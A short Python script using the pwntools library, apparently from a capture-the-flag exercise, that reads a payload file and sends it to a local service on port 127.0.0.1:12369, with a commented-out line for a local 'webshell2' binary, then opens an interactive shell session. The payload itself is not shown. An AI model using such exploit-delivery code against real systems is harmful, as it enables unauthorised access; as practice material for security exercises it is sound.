from pwn import *
import tty
import socket
f = open("./src/o", "rb").read()
context.log_level = 'debug'
r = remote("127.0.0.1", 12369)
#r = process("./src/webshell2", stdin=PTY, raw=False)

r.sendline(f)
#r.sock.shutdown(socket.SHUT_RW)
r.interactive()
